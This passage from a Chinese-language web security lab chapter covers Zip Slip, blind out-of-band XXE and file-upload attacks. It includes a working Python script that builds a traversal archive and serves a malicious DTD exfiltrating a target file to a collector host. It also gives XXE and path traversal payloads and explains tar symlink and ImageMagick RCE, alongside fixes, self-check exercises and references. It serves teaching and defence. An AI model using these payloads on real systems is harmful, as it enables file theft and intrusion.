攻擊成功後，打開靶機後端程式碼，把解壓縮路徑處理換成我們剛剛寫的 `resolveSafePath()`（同時拒絕任何 `SYMTYPE` / `LNKTYPE` 條目），並把 XML 解析器的外部 DTD 與實體展開徹底關掉。重啟服務後再送一次 `evil_reconcile.zip` 與 XXE Payload，確認兩邊都被乾淨擋下。

### 外部靶場對照檢查點（PortSwigger Web Security Academy）

本地跑完後，推薦到 **PortSwigger Web Security Academy** 挑戰下面三個模組的 Practitioner 關卡，對照一下實戰中的變形繞過：

1. **Path traversal**（檢查點：*File path traversal, traversal sequences stripped non-recursively* 與 *validation of start of path*）：親自試試看當後端只做單次字串剔除時，怎麼用 `....//` 讓它自己拼回 `../`；還有當後端要求路徑必須以 `/var/www/images` 開頭時，怎麼構造 `/var/www/images/../../../etc/passwd` 過關。
2. **XXE**（檢查點：*Blind XXE with out-of-band interaction via XML parameter entities* 與 *Exploiting blind XXE to exfiltrate data using a malicious external DTD*）：利用靶場提供的 Burp Collaborator（或 exploit server），實際演練一次為什麼內部 DTD 不能直接把 `%file;` 塞進另一條 `<!ENTITY>` 裡，非得把巢狀的 `%eval;` 寫在外部 `.dtd` 檔案裡不可。
3. **File upload**（檢查點：*Web shell upload via path traversal* 與 *Remote code execution via polyglot web shell upload*）：觀察當上傳 API 直接把 `Content-Disposition` 裡的 `filename="..%2fexploit.php"` 拿去存檔時會發生什麼事；以及怎麼在一張合法的圖片檔裡藏進後端腳本（Polyglot 多態檔），同時騙過影像格式檢查與腳本直譯器。

---

### 參考解答

下面是產生 Zip Slip 壓縮檔與架設 OOB XXE 接收伺服器的完整 Python 腳本（僅供本地授權靶機測試使用）：

```python
#!/usr/bin/env python3
"""
NexusPay Ch09 Lab: Zip Slip 歸檔產生器與 OOB XXE 外部 DTD 接收伺服器
"""
import urllib.parse
import zipfile
from http.server import BaseHTTPRequestHandler, HTTPServer

# ---------------------------------------------------------
# 1. 產生帶有 ../../../../ 路徑的 Zip Slip 壓縮檔
# ---------------------------------------------------------
def build_zip_slip(output_zip: str = "evil_reconcile.zip") -> None:
    malicious_entry = "../../../../app/config/webhook.json"
    payload = b'{"secret":"pwned","endpoint":"http://127.0.0.1:8000/hook"}'
    with zipfile.ZipFile(output_zip, "w", compression=zipfile.ZIP_STORED) as zf:
        zf.writestr(malicious_entry, payload)
    print(f"[+] 已產生 {output_zip}，內含條目: {malicious_entry} ({len(payload)} bytes)")

# ---------------------------------------------------------
# 2. 啟動 OOB XXE 外部 DTD 與資料收集伺服器 (Port 8000)
# ---------------------------------------------------------
TARGET_FILE = "/etc/hostname"
ATTACKER_HOST = "http://host.docker.internal:8000"  # 若在同機非容器直跑可改為 http://127.0.0.1:8000

class OOBHandler(BaseHTTPRequestHandler):
    def do_GET(self) -> None:
        parsed = urllib.parse.urlparse(self.path)
        if parsed.path == "/oob.dtd":
            dtd = (
                f'<!ENTITY % file SYSTEM "file://{TARGET_FILE}">\n'
                f'<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '
                f'\'{ATTACKER_HOST}/collect?data=%file;\'>">\n'
                f"%eval;\n"
                f"%exfil;\n"
            ).encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "application/xml-dtd")
            self.send_header("Content-Length", str(len(dtd)))
            self.end_headers()
            self.wfile.write(dtd)
            print("[*] 目標解析器已來抓 /oob.dtd！")
        elif parsed.path == "/collect":
            qs = urllib.parse.parse_qs(parsed.query)
            print(f"[!] 成功外帶檔案內容: {qs.get('data', ['<empty>'])[0]}")
            self.send_response(200)
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format: str, *args) -> None:
        return  # 關掉預設的存取 log 雜訊

if __name__ == "__main__":
    build_zip_slip()
    print(f"[*] OOB XXE 伺服器已監聽 0.0.0.0:8000 (準備偷讀目標: {TARGET_FILE})")
    server = HTTPServer(("0.0.0.0", 8000), OOBHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        server.server_close()
```

跑起這支腳本後，用 `curl` 把下面的 XML 送到 `POST http://127.0.0.1:3000/v1/invoices/import`：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE invoice [
  <!ENTITY % dtd SYSTEM "http://host.docker.internal:8000/oob.dtd">
  %dtd;
]>
<invoice><id>INV-2026-0091</id></invoice>
```

#### 修補後驗證

把靶機解壓縮邏輯換成 `resolveSafePath()`、拒絕軟硬連結條目，並把路徑檢查拋出的例外轉成 HTTP `400 Bad Request` 後，重新上傳 `evil_reconcile.zip` 會立刻收到 `400 Bad Request`（後端日誌印出 `Path traversal attempt`）；同時把 XML 解析器的 DTD 與外部實體功能關掉後，再送一次上面的發票 XML，你的 Python `OOBHandler` 終端機將安安靜靜，連第一發 `/oob.dtd` 請求都不會再收到。

---

## 自我檢核

- **難度**：進階
- **預估時間**：20 分鐘

蓋上前面的筆記，試著針對下面 4 個常見的檔案處理審查情境抓出破口：

1. **抓出 `path.resolve` 與 `startsWith` 的兩個盲區**：在 Code Review 時，你看到同事寫了這兩行來保護報表下載 API：
   `const p = path.resolve("/srv/nexus/exports", req.query.name);`
   `if (!p.startsWith("/srv/nexus/exports")) return res.status(403).end();`
   請舉出兩種完全不同的 `req.query.name` 輸入（或目錄狀態），說明攻擊者怎麼繞過這行 `startsWith` 讀到不該讀的檔案？
2. **XML 1.0 規範的緊箍咒**：為什麼在打無回顯的 **Blind OOB XXE** 時，攻擊者不能只靠發送一個請求，在該請求的內部 DTD（Internal Subset）裡直接用參數實體 `%file;` 把讀出來的機密拼進另一條 `<!ENTITY % send SYSTEM "http://evil/?x=%file;">` 宣告裡？這撞上了 XML 1.0 的哪兩條語法規則？
3. **擋掉 `..` 與 `/` 還是被打穿的 TAR 解壓縮**：某個備份還原服務在解壓縮 `.tar` 檔案時，已經嚴格檢查了每一個條目的檔名：既不准包含 `..`，也不准以 `/` 開頭。為什麼攻擊者還是能只靠上傳一個 `.tar` 檔，就把惡意排程寫進 `/etc/cron.d/pwn` 拿到 RCE？
4. **副檔名白名單擋不住的縮圖 RCE**：商戶上傳頭像的 API 已經嚴格檢查了檔名結尾必須是 `.png`，存檔時也強制存成 `.png` 副檔名，然後才交給後端的 ImageMagick 做縮圖。為什麼這樣還是可能觸發 Ghostscript 或 SVG 委派漏洞？要怎麼從設定檔根治？

---

### 參考解答

1. **抓出 `path.resolve` 與 `startsWith` 的兩個盲區**：
   - **第一種是同級目錄前綴繞過**：只要傳入 `req.query.name = "../exports-backup/db.sql"`，`path.resolve` 算出來的路徑是 `"/srv/nexus/exports-backup/db.sql"`。因為檢查時漏了結尾斜線 `"/srv/nexus/exports/"`，這個字串依然符合 `startsWith("/srv/nexus/exports")`，當場放行讀走隔壁目錄的備份檔。
   - **第二種是目錄內的既有符號連結（Symlink）**：如果 `/srv/nexus/exports/` 目錄底下因為其他上傳功能或歷史殘留，已經存在一個指向 `/etc` 的軟連結 `sym`，攻擊者只要傳入 `req.query.name = "sym/passwd"`，`path.resolve` 只做純字串計算，算出來是 `"/srv/nexus/exports/sym/passwd"`，完美通過前綴檢查；等到下一行呼叫 `fs.readFile(p)` 時，作業系統核心 VFS 順著 `sym` 指過去的 `inode` 打開的卻是 `/etc/passwd`。
2. **XML 1.0 規範的緊箍咒**：
   - 第一條規則：`SYSTEM "..."` 後面引號裡的網址屬於 `SystemLiteral`，標準 XML 解析器**不會在 `SystemLiteral` 裡面直接展開 `%file;` 參數實體引用**；想把 `%file;` 的值塞進網址，必須靠另一個外層參數實體的文字值（`EntityValue`）去動態構造出整條 `<!ENTITY>` 宣告。
   - 第二條規則：根據 **XML 1.0 規範 §2.8（WFC: PEs in Internal Subset）**，在文件內部的 DTD 子集裡，參數實體引用只能獨立放在頂層宣告之間，**嚴禁出現在另一條標記宣告（Markup Declaration）的內部**。因此攻擊者才必須先在內部 DTD 頂層合法地寫一行 `%dtd;` 引入**外部 DTD**（或本機既有的 `.dtd` 檔），利用外部 DTD 子集允許在宣告內部展開參數實體的特性，完成兩階段巢狀外帶。
3. **擋掉 `..` 與 `/` 還是被打穿的 TAR 解壓縮**：
   - 因為 TAR 歸檔格式原生支援打包符號連結（Typeflag `'2'`，`SYMTYPE`）與硬連結（Typeflag `'1'`，`LNKTYPE`）。
   - 如果解壓縮程式只檢查條目「檔名」而沒有拒絕連結型條目，攻擊者只要在 `.tar` 裡放兩個條目：第一個條目名叫 `cron_link`（Typeflag `'2'`，指向 `/etc/cron.d`），檔名本身完全沒有 `..` 也沒有開頭的 `/`，輕鬆過關；第二個條目名叫 `cron_link/pwn`（Typeflag `'0'` 一般檔案），檔名同樣不含 `..` 與開頭 `/`，但作業系統寫入這個檔案時，就會順著第一階段建好的 `cron_link` 軟連結，直接把內容寫進 `/etc/cron.d/pwn`！
4. **副檔名白名單擋不住的縮圖 RCE**：
   - 因為 ImageMagick 在沒有強制指定輸入格式前綴、也沒有鎖死 `policy.xml` 時，預設是看檔案內容開頭的 **Magic Bytes（魔術位元組）** 來決定叫哪個解碼器或外部委派程式（Delegate）出來幹活，根本不管你的副檔名是不是 `.png`。攻擊者只要把 PostScript（`%!PS-Adobe-`）或 MVG/SVG 內容存成 `avatar.png` 傳上去，在沒加固的環境裡一樣會喚起 Ghostscript 或委派命令。
   - **根治方法**：在伺服器的 ImageMagick `policy.xml` 裡先預設關閉所有編解碼器與外部協定，再只針對業務需要的 `PNG`、`JPEG`、`WEBP` 開白名單（徹底禁用 `PS`、`EPS`、`PDF`、`XPS`、`MVG`、`HTTPS`、`URL` 與 `ephemeral`），同時限制最大像素寬高與記憶體配額；或者乾脆改用不帶外部指令委派機制的 `libvips`（Node.js `sharp` 套件）。

---

## 延伸閱讀

- **ZIP File Format Specification (PKZIP APPNOTE.TXT)**（https://pkware.cachefly.net/webdocs/casestudies/APPNOTE.TXT）：PKWARE 官方的 ZIP 二進位格式規格書，可以對照本章 Worked Example 的 Local File Header 與 Central Directory 結構。
- **Snyk — Zip Slip Vulnerability Research**（https://security.snyk.io/research/zip-slip-vulnerability）：當年揭露各大語言解壓縮套件普遍缺乏路徑正規化防護的經典研究報告與受影響套件清單。
- **W3C Extensible Markup Language (XML) 1.0 Specification (§2.8, §4.2, §4.4)**（https://www.w3.org/TR/xml/）：直接看 §2.8 對內部 DTD 子集參數實體的限制，以及 §4.2 同名實體 First Declaration Wins 的官方定義。
- **OWASP XML External Entity (XXE) Prevention Cheat Sheet**（https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html）：整理了各主流語言與 XML 解析器關閉 DTD 及外部實體的正確設定程式碼。
- **PortSwigger Web Security Academy — Path traversal / XXE / File upload vulnerabilities**（https://portswigger.net/web-security）：包含雙重編碼路徑穿越、OOB/Error-based XXE 與 SVG/Polyglot 上傳的完整線上實戰靶場。

